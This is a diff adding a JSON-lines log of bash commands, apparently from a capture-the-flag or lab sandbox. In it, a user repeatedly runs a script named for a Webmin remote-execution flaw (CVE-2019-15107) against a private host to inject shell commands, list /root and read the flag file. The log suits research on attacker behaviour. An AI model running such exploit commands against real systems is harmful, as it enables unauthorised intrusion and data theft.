@@ -1,0 +1,19 @@
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:14:33.511753+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & ls"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:14:46.279281+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:15:05.553496+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & echo hello"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:15:33.559350+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ & echo hello'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:15:43.357517+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && echo hello'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:16:08.282203+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:16:19.078524+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ && pwd"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:17:01.782179+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cat /root/flag"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:17:11.855313+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 pwd"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:17:25.795056+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:17:43.404032+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 pwd"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:17:53.422299+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 touch file"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:18:07.971389+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ > file"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:18:15.718408+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 cat file"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:18:30.938911+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 ls"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:19:06.325701+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:19:31.601147+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 pwd"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:19:50.649831+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:20:07.945896+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt'"}
